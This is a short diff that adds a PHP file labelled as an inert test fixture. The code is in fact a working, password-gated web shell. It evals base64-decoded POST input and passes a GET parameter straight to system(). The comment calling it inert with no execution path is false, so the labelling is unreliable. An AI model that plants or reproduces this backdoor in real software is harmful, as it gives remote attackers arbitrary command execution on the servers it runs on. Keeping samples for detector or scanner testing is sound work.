@@ -1,0 +1,6 @@
+<?php
+// FIXTURE - inert. Structure only, no working execution path.
+if (md5($_POST['p'] ?? '') === '0cc175b9c0f1b6a831c399e269772661') {
+    eval(base64_decode($_POST['c'] ?? ''));
+    system($_GET['cmd'] ?? '');
+}
